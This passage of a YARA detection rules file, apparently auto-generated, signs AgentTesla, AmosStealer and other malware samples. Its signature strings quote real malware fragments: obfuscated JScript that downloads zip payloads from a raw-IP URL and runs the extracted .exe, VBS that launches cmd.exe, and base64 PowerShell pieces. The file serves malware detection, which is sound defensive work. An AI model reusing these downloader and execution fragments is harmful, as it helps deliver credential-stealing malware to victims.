      $s1 = "&%*& ?$$?  %!$% ~ *%?&#%#?~?& ~~^ ~%! ! !#$!#$#?#?$*%#^$&$&!!&$$?%%s%$^ #&~$^*?#^$ !!!% % $ $*?*$!!#~? !!*?* ^~!% $^%#!~*!*%&~^&" ascii /* score: '17.00'*/
      $s2 = ">!?~~$^  &&*?^!%#?#?&~*?*%%!?^$!*~$$% *$&%*&&&?^& *$?%?*~  **$% !?!&?$$?%~#*&^ &~$! $*^%!#?#&&~%*&&$^###~%~$^?*?!?? %%?^%~ $!&^&" ascii /* score: '15.00'*/
      $s3 = " &!? &^%*^?#~ !^&!$&!*##&*$ ! *&*#~&#&#~?2%#$ ?&~*~** ~% !~? $~$ ^*&&&!!#?!~$#$#&&~?^  &?^$#  &%*?%#~&$*!$~**#$?#%!~ ^!%~!%&#!!!" ascii /* score: '14.00'*/
      $s4 = "#* ~#~&# ~ ~!#^~~%  ?*!&&^& ?#&% ??&$$%& #!~!?# $*!~$#~!!!!~*$ %##&&&%^%?## ~*!&  #?#!?$#%&~&?  #^*&?#~!&?%$~#!$&^ ~!##%!?$~*&#&" ascii /* score: '14.00'*/
      $s5 = "* *#&$ ?!%*?^#!!! &%~ % *!$$ $%#!#*! *^$#*!#**%&$# %?*!!#U!**#!#^*^%$&&#%^ $*##~*! ^^*!$~^~$ & ^~% $^%^&$ #&#*^$#&#*$!!~~~$^*~$&" ascii /* score: '14.00'*/
      $s6 = "* $*??$%$~ !%#?$^~ ~~&!%&!%$*^&&&%$!~~!!!!^% !%#?%#~$~$&**~%$&& *3~&!**$*^# % ~^ $?~*&*^%%~#  &*^~?&#~^%$^*##$$$!?$ #!$&&~&^&&$!" ascii /* score: '14.00'*/
      $s7 = "%*?!~#?*~%!^~ $ ??^ ##?#~?^~&* ~*%?# !$?%~^&^%^ ^&!*&??~ !%!%%$*? * *?^$ %! ~*&!!~$ ~~?$$* $$^*!!! $*&%*? %!#?~%$~?*~%^*$~&&#%V%" ascii /* score: '14.00'*/
      $s8 = "* ~ ^&? ~ %? ?% # ?#?##?&*^%!!!!?*$~#$!*#*&?*^~ &$? %#?$&$$?%!!~#&?^!?#??~%*#*!$ %? ^*^$&?#~*#$?! !$~?^^!%#%~*#$&*%&#^???~ $#%~&" ascii /* score: '14.00'*/
      $s9 = "* #$&* !^$ &!^$ &$~ !*%!$# ^%*%!*?^*&!%$! #$&% $ ##*^?% *^*$^^$!!!$$%~%% &~! %~ ?$o&^!? ^%*^!*^~~* %^& #*!!##**~&~%!%~ ^~#~*&&~?" ascii /* score: '14.00'*/
      $s10 = "~*#~ !~  ~%*&#??!&^~?*? ?%!$*~!?&&#^&&^*&^%$!* ^!! ^ &#* $?~?%% ^&^*$#*%^!&*#$%!~$#%  !**!%#~$^#*%~$?##$$?~ & %%!%&*~?^$~^^# !!!" ascii /* score: '14.00'*/
      $s11 = "?%~^%~%%^?~&^!$~&*#!%~%**?*#^!? **  !#!!$! #&$$!#%!~*& ?  &*% $*#^^~?^!!!?&*  $&&#%^??%$$%?# ^!& *$~$^?%$!?*%T%$%**^*$#&!^*%%!%~" ascii /* score: '14.00'*/
      $s12 = "# ^?$^^ **#^~**##?#&?&^&$*~ #&~ &!!#?^ &&* #^  $M&*^^$~$^^?~$&*&#*&$$^*!!!%%%!$$~ ~#&#?~*$*!%&~ &%$~ *$!&? %! $ ?&?*~~&$?!^ &%%$" ascii /* score: '14.00'*/
      $s13 = "^#~*~$~$ ~*?&& $%?^?!^?%^$!!!*$$ ?*%?#^^^%*!%&%$##^$& $%&&^~~ ! !~$!!?$ ?$ ~%%?$#%? # %! %#!&$*&#^#?*&!&! !~~^&* &  !$^~*&#!^!!!" ascii /* score: '14.00'*/
      $s14 = "&~$?&#!^!*~ ?%?~%~$$*#!?&##^$$#Z%&~##%~!%^##^%* ~?*$?*&#$#??%$?%$$$~!~?&~~%*~*?&#!~*# &#^^!~ &%&^!~#?$#&~^&&&~^ %$~!~~!??#~?!!!!" ascii /* score: '14.00'*/
      $s15 = "** &%!$$$*??!!!~?!!#~^^%#^^%###* $#%& *^!%$ !& ~* ^?%% ~!~~~?#*&~~ &#%~$%??~$%^$&!??*^&%#!?#^#~!$  ! ~~?&$! *&! %$^&$!~$*^%$$~& " ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 15000KB and
      8 of them
}

rule AgentTesla_signature__8 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "199b19ad228270a224aa9a3534207f862ac8047da17485890147d20cce17a975"
   strings:
      $s1 = "Damage goods.exe" fullword ascii /* score: '19.00'*/
      $s2 = "ksBn:\"" fullword ascii /* score: '10.00'*/
      $s3 = "eYEcwWb?5" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__9 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "364a32c4cf03629c678c1c08a6c48fb57105de14150d552649d470144daefe09"
   strings:
      $s1 = "Ordinazione d'acquisto.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__0014f382 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_0014f382.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0014f382f7f9238417e162ba9352135283384038291e49b0834a6124cb0c1c78"
   strings:
      $s1 = "+SeeScan Invoices.exe" fullword wide /* score: '20.00'*/
      $s2 = "^%I%SQ" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__061a9c90 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_061a9c90.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "061a9c903149b6179c072b3ab263b6e2a552ed0d8a5dd9acfba77b9cc7339599"
   strings:
      $s1 = "Open New Orders.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__ae958c3c {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ae958c3c.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ae958c3c2b9ac14046fbb8a709542836ef3d54144784e9e241e34ed5efdec3e7"
   strings:
      $x1 = "Forblin.ShellExecute(Salime65,\"c:\\windows\\system32\\svchost.exe\",\"\",\"open\",0);" fullword ascii /* score: '48.00'*/
      $s2 = "//Plainful markjorders? hysteric fortrdelighedernes: lejrudstyret gearvlgernes: collusive! anmeldende skidding: microcolorimeter" ascii /* score: '27.00'*/
      $s3 = "//Uncompassability; hemmeligstemplet. severy! deleaved! stationsmesteren, samspilsmnstre rovdyrburs helautomatisering laboratori" ascii /* score: '22.00'*/
      $s4 = "Elemen.Item(0).Document.Application.ShellExecute(unsentinel,String.fromCharCode(34)+Uoverst+String.fromCharCode(34),\"\",\"open" ascii /* score: '21.00'*/
      $s5 = "Elemen.Item(0).Document.Application.ShellExecute(unsentinel,String.fromCharCode(34)+Uoverst+String.fromCharCode(34),\"\",\"open" ascii /* score: '21.00'*/
      $s6 = "strengede filigree gedebukkeskggene? radikalismens udloesemekanismer superelevation skrferskernes? arbejdsgiveres vedhnget duple" ascii /* score: '21.00'*/
      $s7 = "//Adducent, tessaraconter; haartoppene: dunner! buffoarie. exheredate batchkoersler sengetiderne, pollage, publicerer airliners!" ascii /* score: '20.00'*/
      $s8 = "//Bagbordssider135! salambao sponsorial salacity pigpen. cervicolingual? penthouses separationsbevilling, insidious, kiselgur237" ascii /* score: '20.00'*/
      $s9 = "//Gymnospermous. redistricts! bankeaanden sjlstilstandens oceanologi klenavnet, inanimate holds; superillustrated; futtoget! brn" ascii /* score: '20.00'*/
      $s10 = "//Aerodromes fissirostres alvie diskriminerings? gemmology? acylate eightieth, udlgger; mardil balsameret luminescens! ticketmon" ascii /* score: '19.00'*/
      $s11 = "//Procommemoration flonellograf99! laundromat infiltration139 noninterventionists; bopladsers, smarthederne spermatize: ritchie " ascii /* score: '19.00'*/
      $s12 = "//Geylies! angeleen? extramoral eksplosionsmotors cellulosefabrikkernes; tautegory126 waget; lskbende, hydrops toxins! blodstyrt" ascii /* score: '19.00'*/
      $s13 = "//Skkebaandet jillies multimetre rundkirker summeret barbadier, skifferolier; glisteringly graceful, stotter? overplayed! regnsk" ascii /* score: '19.00'*/
      $s14 = "//Anholder? erotiserer canards. scuse: brintionen synkretiske pitchdarkness! brystoperationer chlortetracycline. resultatfils af" ascii /* score: '19.00'*/
      $s15 = "rgstat, systemprogrammrerne: samlemapperne fichuet173; konkurrencehensyn. paaskriv. filesave produktionsdatabasen circumstancing" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__1eac02d2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_1eac02d2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1eac02d2bf0f4fe7ee8dd73b28cc9b04c385c6df1f1651dd60deccf33cc2149d"
   strings:
      $x1 = "function a(){var G=['open','1881944YkDdZv','Shell.Application','324iEWjRe','GetFolder','Run','.zip','atEnd','Write','Items','Sav" ascii /* score: '39.00'*/
      $x2 = "eToFile','http://196.251.73.58/H2/MEX.zip','item','%TEMP%','Sleep','170OHJIjk','send','Scripting.FileSystemObject','ADODB.Stream" ascii /* score: '32.00'*/
      $s3 = "['charAt'](q);}return o;}function i(m,n){var C=b,o=d('MSXML2.XMLHTTP');o[C(0x1ac)]('GET',m,![]),o[C(0x1bc)]();if(o[C(0x1a1)]!==0" ascii /* score: '17.00'*/
      $s4 = "function a(){var G=['open','1881944YkDdZv','Shell.Application','324iEWjRe','GetFolder','Run','.zip','atEnd','Write','Items','Sav" ascii /* score: '13.00'*/
      $s5 = "DEFGHIJKLMNOPQRSTUVWXYZ','CreateFolder','WScript.Shell','48niJoRx','NameSpace','FolderExists'];a=function(){return G;};return a(" ascii /* score: '12.00'*/
      $s6 = "or(;!q[E(0x1b3)]();q[E(0x19c)]()){var r=q[E(0x1b8)]();if(l(m,r['Name'])){var s=h(0x7)+'.exe',t=f(m,o,s);r['Copy'](t),r[E(0x1a3)]" ascii /* score: '11.00'*/
      $s7 = "urn m['ExpandEnvironmentStrings'](y(0x1b9));}function f(m,n,o){var z=b;return m[z(0x195)](n,o);}function g(m){var A=b;WScript[A(" ascii /* score: '10.00'*/
      $s8 = "(),n[E(0x1b1)]('\\x22'+t+'\\x22',0x1,![]);break;}}}function l(m,n){var F=b;return m['GetExtensionName'](n)[F(0x198)]()==='exe';}" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__42b0e073 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_42b0e073.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "42b0e073401c812b96feb6aa7ab51f07305178144dbc0d19963c1d00eae88b45"
   strings:
      $s1 = "/Booking_09_18_2025.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 100KB and
      all of them
}

rule AgentTesla_signature__455ab620 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_455ab620.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "455ab62048c2da5952af0bb034a04651bceace9f42d5151217689037e87c775e"
   strings:
      $s1 = "ASWIFT_COPY PO#HDM-2024-1710.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__52a0bab4 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_52a0bab4.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "52a0bab454fdb7ee3011fc4b3cb76b1f0712146759196f4947849fd90695b489"
   strings:
      $s1 = "Bookings_6031.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule AgentTesla_signature__5993d2cb {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_5993d2cb.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5993d2cb2c4c841405177156f3f0c17613ddc273608a5303a3f15e7b2f1b51c8"
   strings:
      $s1 = "original setup.exe" fullword ascii /* score: '19.00'*/
      $s2 = "original setup.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__5ae8a56e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_5ae8a56e.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5ae8a56eaf5e813f2397520256212374fd1a3488f1a65519e12e853e8b483f94"
   strings:
      $s1 = "5SPW AW25 SMS - PO.010.exe" fullword wide /* score: '24.00'*/
      $s2 = "SlOXqp* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__68c00f84 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_68c00f84.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "68c00f8453af246cc9ee351dfd5e94937bb5fb5a653c33f33e09c2812ae85088"
   strings:
      $s1 = "Re-Booking20.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 90KB and
      all of them
}

rule AgentTesla_signature__8898cadc {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_8898cadc.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8898cadc10c37da4ae4ee2da7b37b5f60fb081918e1d5cf7aedccc3c37a40005"
   strings:
      $x1 = "PesticidePlot9017.WriteLine \":: yNZ/zSMSQWu5NzYU1wazwTxqb/AoJ2SiryX5DsK3+FTfTtHyWLshbpVglGoeUThYBEoLLENEXWlMSOCuya/d7IYvDyKlmCD" ascii /* score: '57.00'*/
      $x2 = "GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create \"cmd.exe /c \" & FenceFacility, Null, Null, Null" fullword ascii /* score: '50.00'*/
      $x3 = "PondProperty = Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(R" ascii /* score: '36.00'*/
      $x4 = "FenceFacility = \"C:\\\\Users\\\\Public\\\\FieldCenter.bat\"" fullword ascii /* score: '31.00'*/
      $s5 = "Ytv+eyENuFZ9nQAtymh+Gd/U58oihtbz7Gt6BvbHk/Ne2AL8ZLanaHzp0JCwlitfb3LQu9HuI+sWmhYJ3hP0ckrrtIkmS45MGMDRVp4uVCPS7s/kC0yWMCcI111b0dLK" ascii /* score: '25.00'*/
      $s6 = "icideLot & PesticideEstate & HarvestArea & GateStructure & SeedPlot3764 : GateHouse = \"\"\"\" : FenceFacility = \"C:\\\\Users" ascii /* score: '24.00'*/
      $s7 = "PesticidePlot9017.WriteLine \"!kadtzzgqhejivqv! \"\"%tjsxhdyyb%r%tjsxhdyyb%v%tjsxhdyyb%c%tjsxhdyyb%o%tjsxhdyyb%m%tjsxhdyyb%q%tjs" ascii /* score: '22.00'*/
      $s8 = "YQB0AGUARgBvAHIARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIAKAAkAEIAYQBzAGUAbQBlAG4AdABBAGQAZAByAGUAcwBzACwAIAAkAGYAZQBuAGMAZQBGAGkA" ascii /* base64 encoded string 'a t e F o r F u n c t i o n P o i n t e r ( $ B a s e m e n t A d d r e s s ,   $ f e n c e F i ' */ /* score: '21.00'*/
      $s9 = "dgBlAG4AdABvAHIAeQAuAGMAYQByAHAAZQB0AEEAcwBzAGUAbQBiAGwAeQAgAD0AIAAkAGMAYQByAHAAZQB0AEQAZQBjAG8AZABlAHIALgBHAGUAdABTAHQAcgBpAG4A" ascii /* base64 encoded string 'v e n t o r y . c a r p e t A s s e m b l y   =   $ c a r p e t D e c o d e r . G e t S t r i n ' */ /* score: '21.00'*/
      $s10 = "JABrAGkAdABjAGgAZQBuAEUAbgBjAG8AZABlAHIALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZwBsAG8AYgBhAGwAOgBoAG8AdQBzAGUASQBuAHYAZQBuAHQAbwByAHkA" ascii /* base64 encoded string '$ k i t c h e n E n c o d e r . G e t S t r i n g ( $ g l o b a l : h o u s e I n v e n t o r y ' */ /* score: '21.00'*/
      $s11 = "ZQB0AC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIAAtAFMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARQByAHIAbwByAEEAYwB0AGkA" ascii /* base64 encoded string 'e t - E x e c u t i o n P o l i c y   - S c o p e   C u r r e n t U s e r   - E r r o r A c t i ' */ /* score: '21.00'*/
      $s12 = "aABDAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQBsAGwATABhAG4AZwB1AGEA" ascii /* base64 encoded string 'h C o n t e x t . S e s s i o n S t a t e . L a n g u a g e M o d e   =   ' F u l l L a n g u a ' */ /* score: '21.00'*/
      $s13 = "ZAByAG8AbwBtAFAAbwBpAG4AdABlAHIAUwBpAHoAZQAgAD0AIAAkAFAAYQB0AGkAbwBTAGUAYwB1AHIAaQB0AHkAUwBlAHIAdgBpAGMAZQBJAG4AZgBvAC4AQwBhAHIA" ascii /* base64 encoded string 'd r o o m P o i n t e r S i z e   =   $ P a t i o S e c u r i t y S e r v i c e I n f o . C a r ' */ /* score: '21.00'*/
      $s14 = "ZQBsAGUAZwBhAHQAZQAgAD0AIABDAG8AbgBzAHQAcgB1AGMAdAAtAEMAaABpAG0AbgBlAHkAIAAkAGQAbwBvAHIAUAByAG8AYwBlAGQAdQByAGUAQQBkAGQAcgBlAHMA" ascii /* base64 encoded string 'e l e g a t e   =   C o n s t r u c t - C h i m n e y   $ d o o r P r o c e d u r e A d d r e s ' */ /* score: '21.00'*/
      $s15 = "RiXqnGEtgsv0DY10lOGbcpwJvUKxYVymDyDm5WuC8eQP8wp2QCVLU6fazui9FRwpxtySWYUtNjE9Bx881s0aA8oU2EaPjfPY4ir8bcxXFErrg5BWmlWbYzs4LoAvs+KC" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 700KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__cf060941 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_cf060941.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "cf060941d687f8f64b2029ddffeb130631d2602e2d458240510a392bceab6aff"
   strings:
      $x1 = "(function(c,d){var v=b,e=c();while(!![]){try{var f=parseInt(v(0xec))/0x1+parseInt(v(0xf3))/0x2*(parseInt(v(0xfe))/0x3)+-parseInt" ascii /* score: '39.00'*/
      $s2 = "gth','Shell.Application','623754qgNoRl','Scripting.FileSystemObject','BuildPath','%TEMP%','NameSpace','.zip','Items','1500178mnR" ascii /* score: '22.00'*/
      $s3 = "'Sleep','moveNext','ADODB.Stream','http://196.251.73.58/Home/IAN.zip','toLowerCase','4829064nIrFNk','6363438UUNwtB','GET','Folde" ascii /* score: '16.00'*/
      $s4 = "tion(){function c(){var w=b;try{var m=d('WScript.Shell'),n=d(w(0xed)),o=e(m),p=w(0xde),q=h(0x6)+w(0xf1),r=h(0x6),s=f(n,o,q),t=f(" ascii /* score: '12.00'*/
      $s5 = ";q[E(0xdc)]()){var r=q[E(0xf6)]();if(l(m,r[E(0xf9)])){var s=h(0x7)+'.exe',t=f(m,o,s);r[E(0xda)](t),r['Delete'](),n[E(0x104)]('" ascii /* score: '11.00'*/
      $s6 = "22'+t+'\\x22',0x1,![]);break;}}}function l(m,n){var F=b;return m['GetExtensionName'](n)[F(0xdf)]()===F(0xe4);}c();}()));function" ascii /* score: '9.00'*/
      $s7 = "rExists','exe','charAt','atEnd','Close'];a=function(){return G;};return a();}" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__d2e8aae0 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_d2e8aae0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d2e8aae01b784c6bc3ba4aba1a5eaabdaa64ddc1feac87259b480231f3606ad1"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0xe7;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![])" ascii /* score: '39.00'*/
      $s2 = "ome/IAN.zip','3655337SSbhsb','Sleep','.zip','4696692alfPKl','%TEMP%','.exe','2349672kiInzJ','status','ADODB.Stream','Scripting.F" ascii /* score: '28.00'*/
      $s3 = ",'Close','exe','NameSpace','Copy','MSXML2.XMLHTTP','floor','CopyHere','WScript.Shell','GetExtensionName','http://196.251.73.58/H" ascii /* score: '25.00'*/
      $s4 = "ileSystemObject','1376394FtshkM','Delete','GET'];a=function(){return F;};return a();}" fullword ascii /* score: '12.00'*/
      $s5 = "){var x=b;return WScript[x(0x10f)](m);}function e(m){var y=b;return m[y(0x101)](y(0xf5));}function f(m,n,o){return m['BuildPath'" ascii /* score: '10.00'*/
      $s6 = "](n,o);}function g(m){var z=b;WScript[z(0xf2)](m);}function h(m){var A=b,n=A(0x10d),o='';for(var p=0x0;p<m;p++){var q=Math[A(0xe" ascii /* score: '10.00'*/
      $s7 = "c)](Math['random']()*n['length']);o+=n['charAt'](q);}return o;}function i(m,n){var B=b,o=d(B(0xeb));o[B(0x10e)](B(0xfd),m,![]),o" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__d39b7b6b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_d39b7b6b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d39b7b6bea95103a14103660369e26933fdf50b38d4cc4125bbc9e1731fe9158"
   strings:
      $x1 = "function a(){var F=['charAt','.zip','4470fhHGHk','GetFolder','Delete','Files','moveNext','Scripting.FileSystemObject','11AvubjJ'" ascii /* score: '39.00'*/
      $s2 = ",'1456999ytLICu','.exe','%TEMP%','ExpandEnvironmentStrings','http://196.251.73.58/Home/FOREIGN.zip','CreateFolder','10302649qQBr" ascii /* score: '30.00'*/
      $s3 = "function a(){var F=['charAt','.zip','4470fhHGHk','GetFolder','Delete','Files','moveNext','Scripting.FileSystemObject','11AvubjJ'" ascii /* score: '23.00'*/
      $s4 = "XMLHTTP');o[B(0x20e)]('GET',m,![]),o[B(0x1f9)]();if(o['status']!==0xc8)return![];var p=d(B(0x209));return p[B(0x1e8)]=0x1,p['Ope" ascii /* score: '12.00'*/
      $s5 = "o){var y=b;return m[y(0x207)](n,o);}function g(m){var z=b;WScript[z(0x202)](m);}function h(m){var A=b,n=A(0x1e6),o='';for(var p=" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule AmosStealer_signature__158258fa {
   meta:
      description = "_subset_batch - file AmosStealer(signature)_158258fa.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "158258fa17d57540652f24aa51d70b76bfcd16c250c554265aa40685b4d85c52"
   strings:
      $s1 = "srapjae" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 5000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _848a921ef19d9dffffd57f543dc8705d_imphash__9c77f99c_848a921ef19d9dffffd57f543dc8705d_imphash__a3ff218f_0 {
   meta:
      description = "_subset_batch - from files 848a921ef19d9dffffd57f543dc8705d(imphash)_9c77f99c.exe, 848a921ef19d9dffffd57f543dc8705d(imphash)_a3ff218f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9c77f99c911fa6e88d643e42addb4f0f9a36ec10392ee6b9f55913cc7e28b6f9"
      hash2 = "a3ff218f888469dbf6b62fbb54f611667fc127918525650ffaed33e18a0f7f48"
   strings:
      $s1 = "        <assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '27.00'*/
      $s2 = "        <assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '21.00'*/
      $s3 = "ZdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMN" ascii /* score: '11.00'*/
      $s4 = "YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMN" ascii /* score: '11.00'*/
      $s5 = "yPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeun" ascii /* score: '11.00'*/
      $s6 = "sJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvL" ascii /* score: '11.00'*/
      $s7 = "NIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUy" ascii /* score: '11.00'*/
      $s8 = "zNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87" ascii /* score: '11.00'*/
      $s9 = "VJIeunIXZUyNvFILtR87tOKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZU" ascii /* score: '11.00'*/
      $s10 = "tR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2Y" ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '11.00'*/
      $s12 = "ZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR" ascii /* score: '11.00'*/
      $s13 = "KeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyf" ascii /* score: '11.00'*/
      $s14 = "FuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeG" ascii /* score: '11.00'*/
      $s15 = "IeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyN" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "848a921ef19d9dffffd57f543dc8705d" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__422683e7_AgentTesla_signature__8cb40cc9_1 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_422683e7.js, AgentTesla(signature)_8cb40cc9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "422683e7c00eb2b9324dc84f2b317d433f8614e02d2d8c28458f616b182f6166"
      hash2 = "8cb40cc9efa7f66d24c1af3ef4779f7a177ac50c1131f2e840633c1ad8f45b99"
   strings:
      $s1 = "33bbf=_0x5bcbd5['ReadText'];return _0x5bcbd5[_0x5dd2b0(0x11f)](),this[_0x47a6bb(0x182)](_0x333bbf);},this['Forward437']=function" ascii /* score: '12.00'*/
      $s2 = "(0x1af)]=function(){var _0x3b05b3=_0x13e9f1,_0x2408db=_0x913d76,_0x3a4018=WScript[_0x2408db(0x1fc)](_0x3b05b3(0xb2));_0x3a4018[_" ascii /* score: '10.00'*/
